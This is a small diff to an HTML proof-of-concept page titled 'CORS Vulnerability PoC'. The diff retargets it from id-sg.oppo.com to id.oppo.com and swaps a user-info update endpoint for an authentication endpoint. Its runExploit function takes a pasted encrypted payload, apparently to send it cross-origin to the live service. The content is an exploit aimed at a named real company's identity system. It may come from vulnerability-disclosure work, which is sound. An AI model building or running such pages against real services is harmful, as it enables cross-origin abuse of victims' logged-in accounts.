@@ -19,7 +19,7 @@
 
 <div class="container">
     <h1>CORS Vulnerability PoC</h1>
-    <p>Target: <code>id-sg.oppo.com</code></p>
+    <p>Target: <code>id.oppo.com</code></p>
     
     <label class="label">Input Request Body (Encrypted Payload):</label>
     <textarea id="payloadInput" placeholder="Paste encrypted payload here (H4sIA...)"></textarea>
@@ -34,7 +34,7 @@
     function runExploit() {
         const resultDiv = document.getElementById("result");
         const payload = document.getElementById("payloadInput").value;
-        const targetUrl = "https://id-sg.oppo.com/uc/web/v1/user-info/update-basic-info";
+        const targetUrl = "https://id.oppo.com/identity/web/v1/authn/auth";
 
         if (!payload) {
             alert("Please paste a payload first!");
@@ -71,3 +71,4 @@
 
 </body>
 </html>
+
